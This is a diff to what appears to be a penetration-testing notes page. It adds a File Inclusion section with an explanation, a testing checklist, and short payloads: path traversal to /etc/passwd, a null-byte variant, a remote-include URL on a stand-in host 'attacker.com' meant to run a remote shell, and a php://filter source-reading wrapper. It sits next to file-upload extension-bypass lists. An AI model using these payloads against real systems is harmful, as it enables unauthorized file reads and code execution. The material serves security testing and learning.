@@ -1,8 +1,70 @@
 # File upload
 
+### What is it?
+
+File Inclusion vulnerabilities allow an attacker to include files on a server through the web browser. This can occur in two forms: Local File Inclusion (LFI) and Remote File Inclusion (RFI). LFI exploits enable attackers to read files on the server, while RFI allows attackers to execute arbitrary code by including remote files over the internet.
+
+**A simple example**
+
+* A vulnerable web application has the endpoint /page?file={filename}
+* When a request is made, the application dynamically includes the content of the file specified in the query parameter, for example, PHP's include() function: include($filename);
+* If an attacker modifies {filename} to a path such as `../../etc/passwd` or a remote URL `http://attacker.com/malicious.php`, they can read sensitive files or execute malicious code.
+
+It's important to note that the specific impact and exploitation techniques can vary depending on server configuration, programming language, and application logic. File Inclusion vulnerabilities can lead to:
+
+* Sensitive data exposure
+* Remote code execution
+* Cross-site scripting
+
+**Other learning resources:**
+
+* \[To be updated]
+
+**Writeups:**
+
+Have a good writeup & want to share it here? Drop me a message on [LinkedIn.](https://www.linkedin.com/in/kayemba-h-99082a96/)
+
+### Checklist
+
+* [ ] What is the technology stack you're attacking?
+  * [ ] What server-side language is being used (PHP, JSP, ASP, etc.)
+  * [ ] Is the application running on a standard web server (Apache, Nginx, IIS)?
+* [ ] Identify potential injection points
+  * [ ] URL parameters
+  * [ ] Form fields
+  * [ ] HTTP headers (e.g., Referer, User-Agent)
+* [ ] Test for Local File Inclusion (LFI)
+  * [ ] Can you access local files? (e.g., ../../../etc/passwd)
+  * [ ] Test with common Unix and Windows paths
+  * [ ] Test for null byte injection (e.g., ../../../etc/passwd%00)
+* [ ] Test for Remote File Inclusion (RFI)
+  * [ ] Can you include remote files? (e.g., [http://attacker.com/malicious.php)\&#x20](http://attacker.com/malicious.php\)\&#x20);
+  * [ ] Test for protocol wrappers (e.g., php://, data://)
+* [ ] Is user input properly validated and sanitized?
+* [ ] Are only allow-listed files allowed to be included?
+* [ ] Is the application configured to disallow remote file inclusion?
+
+### Exploitation// Some code
+
+```shellscript
+# Basic LFI to read 
+/etc/passwd 
+../../../../etc/passwd
+```
+
+```shellscript
+# RFI to execute a remote shell 
+http://attacker.com/malicious.php
+```
+
+```shellscript
+# Using PHP wrappers to bypass restrictions 
+php://filter/convert.base64-encode/resource=index.php
+```
+
 ## File upload
 
-```
+```shellscript
 # File name validation
     # extension blacklisted:
     PHP: .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
@@ -119,7 +181,7 @@ https://github.com/sAjibuu/upload_bypass
 
 #### Cheatsheet
 
-```
+```shellscript
 upload.random123		---	To test if random file extensions can be uploaded.
 upload.php			---	try to upload a simple php file.
 upload.php.jpeg 		--- 	To bypass the blacklist.
